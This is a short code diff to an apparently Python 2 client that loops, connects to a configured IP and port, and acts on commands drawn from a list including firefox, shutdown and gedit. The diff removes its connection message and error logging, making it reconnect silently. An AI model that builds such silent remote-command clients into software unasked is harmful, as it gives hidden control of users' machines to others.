@@ -12,7 +12,6 @@ acc = ['firefox', 'shutdown', 'gedit']
 
 while True:
     try:
-        print "Trying to connect ..."
         conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         conn.connect((IP_address, Port))
         while True:
@@ -35,8 +34,7 @@ while True:
                         		continue
                 else:
                 		continue
-    except Exception as error:
-    	print "In Except .. Exception occured: "+repr(error)
+    except:
     	time.sleep(10)
     	continue
    		
